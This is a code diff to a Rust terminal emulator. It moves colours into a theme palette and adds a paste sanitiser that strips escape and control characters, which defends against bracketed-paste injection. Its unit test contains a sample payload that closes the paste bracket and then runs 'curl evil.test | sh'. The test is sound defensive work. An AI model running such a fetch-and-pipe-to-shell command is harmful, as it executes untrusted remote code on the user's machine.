@@ -12,7 +12,7 @@ use gpui::{
 use gpui_component::{ActiveTheme as _, Icon, IconName, Sizable as _, hover_card::HoverCard};
 
 use super::backend::{Backend, BackendEvent};
-use super::grid::{Cell, Grid, default_bg};
+use super::grid::{Cell, Grid, TerminalPalette};
 use super::stats::{DiskInfo, RemoteStats};
 use crate::settings::AppSettings;
 
@@ -32,10 +32,6 @@ actions!(
         PasteClipboard
     ]
 );
-
-fn cursor_fg() -> Hsla {
-    hsla(0., 0., 0.08, 1.)
-}
 
 #[derive(Clone, Copy, PartialEq)]
 struct RunStyle {
@@ -63,8 +59,26 @@ impl Selection {
     }
 }
 
-fn selection_bg() -> Hsla {
-    hsla(215. / 360., 0.45, 0.32, 1.)
+fn sanitize_paste(text: &str) -> String {
+    let mut out = String::with_capacity(text.len());
+    let mut chars = text.chars().peekable();
+
+    while let Some(c) = chars.next() {
+        match c {
+            '\r' => {
+                if chars.peek() == Some(&'\n') {
+                    chars.next();
+                }
+                out.push('\r');
+            }
+            '\n' => out.push('\r'),
+            '\t' => out.push('\t'),
+            c if c.is_control() => {}
+            c => out.push(c),
+        }
+    }
+
+    out
 }
 
 pub struct TerminalView {
@@ -320,7 +334,7 @@ impl TerminalView {
     fn paste(&mut self, text: &str) {
         self.scroll_offset = 0;
         self.selection = None;
-        let text = text.replace("\r\n", "\r").replace('\n', "\r");
+        let text = sanitize_paste(text);
         if self.grid.bracketed_paste {
             let mut bytes = b"\x1b[200~".to_vec();
             bytes.extend_from_slice(text.as_bytes());
@@ -363,6 +377,11 @@ impl Render for TerminalView {
                 opacity
             }
         };
+        let (surface, surface_foreground) = {
+            let palette = cx.global::<TerminalPalette>();
+            (palette.background, palette.foreground)
+        };
+        self.grid.set_reported_colors(surface_foreground, surface);
 
         let measure = {
             let weak = cx.entity().downgrade();
@@ -408,6 +427,7 @@ impl Render for TerminalView {
                 }
                 let base_font = gpui::font(font_family.clone());
                 let (quads, lines) = {
+                    let palette = cx.global::<TerminalPalette>().clone();
                     let view = entity.read(cx);
                     let selection = view.selection.map(|s| s.range());
                     build_paint(
@@ -419,6 +439,7 @@ impl Render for TerminalView {
                         px(line_height),
                         px(font_size),
                         &base_font,
+                        &palette,
                         window,
                     )
                 };
@@ -627,8 +648,8 @@ impl Render for TerminalView {
             .size_full()
             .min_w_0()
             .min_h_0()
-            .bg(default_bg().opacity(surface_opacity))
-            .text_color(hsla(0., 0., 0.9, 1.))
+            .bg(surface.opacity(surface_opacity))
+            .text_color(surface_foreground)
             .font_family(font_family)
             .text_size(px(font_size))
             .line_height(px(line_height))
@@ -1074,6 +1095,7 @@ fn build_paint(
     line_height: Pixels,
     font_size: Pixels,
     base_font: &Font,
+    palette: &TerminalPalette,
     window: &Window,
 ) -> (Vec<PaintQuad>, Vec<(ShapedLine, Point<Pixels>)>) {
     let mut quads = Vec::with_capacity(grid.rows);
@@ -1095,13 +1117,13 @@ fn build_paint(
         let cell_bg = |col: usize| -> Option<Hsla> {
             let cell = cell(col);
             if cursor == Some((line_id, col)) {
-                Some(cell.fg.as_fg())
+                Some(palette.cursor)
             } else if selection
                 .is_some_and(|(start, end)| (line_id, col) >= start && (line_id, col) <= end)
             {
-                Some(selection_bg())
+                Some(palette.selection)
             } else {
-                cell.bg.as_bg()
+                cell.bg.as_bg(palette)
             }
         };
         let mut col = 0;
@@ -1159,7 +1181,7 @@ fn build_paint(
                 SharedString::from(std::mem::take(text)),
                 font_size,
                 &[run],
-                None,
+                Some(char_width),
             );
             lines.push((
                 shaped,
@@ -1171,9 +1193,9 @@ fn build_paint(
             let cell = cell(col);
             let is_cursor = cursor == Some((line_id, col));
             let mut color = if is_cursor {
-                cell.bg.as_bg().unwrap_or(cursor_fg())
+                palette.background
             } else {
-                cell.fg.as_fg()
+                cell.fg.as_fg(palette)
             };
             if cell.dim() {
                 color.a *= 0.6;
@@ -1185,16 +1207,12 @@ fn build_paint(
                 underline: cell.underline(),
                 strike: cell.strike(),
             };
-            let ch = cell.ch();
-            if style != Some(cell_style) || !ch.is_ascii() {
+            if style != Some(cell_style) {
                 flush(&mut text, style.take(), start_col);
                 style = Some(cell_style);
                 start_col = col;
             }
-            text.push(ch);
-            if !ch.is_ascii() {
-                flush(&mut text, style.take(), start_col);
-            }
+            text.push(cell.ch());
         }
         flush(&mut text, style, start_col);
     }
@@ -1272,4 +1290,34 @@ fn translate_key(event: &KeyDownEvent, application_cursor_keys: bool) -> Option<
         }
     };
     Some(bytes.to_vec())
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    #[test]
+    fn a_paste_cannot_close_its_own_bracket() {
+        let payload = "echo safe\x1b[201~\rcurl evil.test | sh\r";
+        let cleaned = sanitize_paste(payload);
+
+        assert!(
+            !cleaned.contains('\x1b'),
+            "an escape in the clipboard must never reach the shell: {cleaned:?}"
+        );
+        assert_eq!(cleaned, "echo safe[201~\rcurl evil.test | sh\r");
+    }
+
+    #[test]
+    fn ordinary_text_survives_a_paste() {
+        assert_eq!(sanitize_paste("ls -la\n"), "ls -la\r");
+        assert_eq!(sanitize_paste("a\r\nb"), "a\rb");
+        assert_eq!(sanitize_paste("a\tb"), "a\tb");
+        assert_eq!(sanitize_paste("héllo ☃"), "héllo ☃");
+    }
+
+    #[test]
+    fn stray_control_bytes_are_dropped() {
+        assert_eq!(sanitize_paste("a\x00\x07\x08b"), "ab");
+    }
 }
